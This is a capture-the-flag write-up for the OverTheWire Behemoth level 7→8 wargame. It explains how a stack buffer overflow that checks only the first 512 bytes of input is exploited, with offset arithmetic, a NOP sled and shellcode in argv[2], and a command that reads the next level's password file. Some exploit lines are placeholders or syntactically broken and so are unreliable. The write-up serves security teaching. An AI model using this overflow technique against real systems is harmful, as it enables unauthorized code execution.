# OverTheWire — Behemoth Level 7 → 8  [FINAL LEVEL]

> Goal: Get behemoth8 password from `behemoth7`. Result: **`**********`** (hidden) — **Behemoth complete!**
> Technique: env wipe + **only first 512 chars** checked for alphanumeric → overwrite return
> address beyond that; shellcode in `argv[2]`.

---

## 1. Connection
```bash
ssh behemoth7@behemoth.labs.overthewire.org -p 2221
```

## 2. Vulnerability — disasm
```c
char buf[0x20c];                 // ebp-0x20c (524)
for(i=0; envp[i]; i++) memset(envp[i], 0, strlen(envp[i]));   // wipe ALL env
if (argc > 1) {
    p = argv[1]; count = 0;
    while (*p && count <= 0x1ff) {        // <<< only first 512 characters
        count++;
        if (!(isalpha(*p) || isdigit(*p)))            // NOT alphanumeric
            { fprintf(stderr,"Non-alpha chars found..."); exit(1); }
        p++;
    }
}
strcpy(buf, argv[1]);            // overflow (if argv[1] > 524)
```

## 3. Key observations
- **Character check covers only the first 512 bytes** (`count <= 0x1ff` → 0..511). Bytes after
  512 are **not checked** → the return address (offset 528) can be arbitrary.
- **Offset:** `buf = ebp-0x20c` (524), saved EIP at `ebp+4` → `0x20c + 4 = **528**`.
- **env wiped** → EGG unusable → put shellcode in **`argv[2]`** (not wiped; same idea as narnia4).

## 4. Exploit
```bash
cd /tmp
ARGV2=$(python3 -c 'b"\x90"*40000 + SHELLCODE_57')          # sled + setreuid/execve
ADDR=$(/tmp/bhm7_argvaddr1 "$(python3 -c 'b"A"*532')" "$ARGV2" | ...)   # argv[2] address (helper)
RET=$((0x$ADDR + 20000))
# argv[1] = "A"*528 (first 512 alphanumeric) + RET ; argv[2] = sled+shellcode
# env wiped -> no PATH in shell -> ABSOLUTE paths
python3 -c 'timed: "/usr/bin/id; /bin/cat /etc/behemoth_pass/behemoth8"' | \
  /behemoth/behemoth7 "$(python3 -c "b'A'*528 + pack('<I',RET)")" "$ARGV2"
```
> `'A'` (0x41) is alphanumeric → passes the first 512-char check. Bytes 528..531 = RET (unchecked;
> must not contain null — argv string truncation). Output: `uid=13008(behemoth8)` → password.



## Lessons
| Topic | Note |
|-------|------|
| Partial input check | Only first 512 bytes checked → return address (at 528) is unchecked |
| Offset 528 | `buf=ebp-0x20c` → 524+4 |
| env wipe → argv[2] | Put shellcode in non-wiped `argv[2]`; address is stable even after env wipe |
| Alphanumeric padding | First 512 = `'A'` (alpha) → passes the check |
| Null-free ret | argv string is cut at null → ret bytes must not contain null |
